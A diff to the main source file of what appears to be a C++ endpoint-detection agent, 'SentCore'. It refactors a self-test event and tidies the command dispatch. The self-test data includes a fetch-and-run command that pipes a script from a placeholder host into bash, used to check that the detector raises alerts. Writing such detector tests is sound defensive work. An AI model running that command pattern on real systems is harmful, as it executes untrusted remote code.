@@ -27,10 +27,12 @@ int run_self_test()
     sentcore::Event event{};
     event.sequence = 1U;
     event.timestamp_ns = sentcore::now_unix_ns();
-    event.type = sentcore::EventType::ProcessStart;
-    event.pid = 4242;
-    event.path.assign("/tmp/payload");
-    event.command.assign("curl https://example.invalid/payload.sh | bash");
+    event.source = sentcore::EventSource::Internal;
+
+    auto& process = event.emplace_process();
+    process.pid = 4242;
+    process.executable.assign("/tmp/payload");
+    process.command.assign("curl https://example.invalid/payload.sh | bash");
 
     const auto batch = detector.evaluate(event);
     if (batch.count < 2U)
@@ -54,15 +56,18 @@ int main(int argc, char** argv)
         sentcore::Agent agent(sentcore::AgentOptions{});
         return agent.run();
     }
+
     if (command == "self-test")
     {
         return run_self_test();
     }
+
     if (command == "version" || command == "--version" || command == "-v")
     {
         std::cout << "SentCore " << sentcore::kVersion << '\n';
         return EXIT_SUCCESS;
     }
+
     if (command == "help" || command == "--help" || command == "-h")
     {
         print_help();
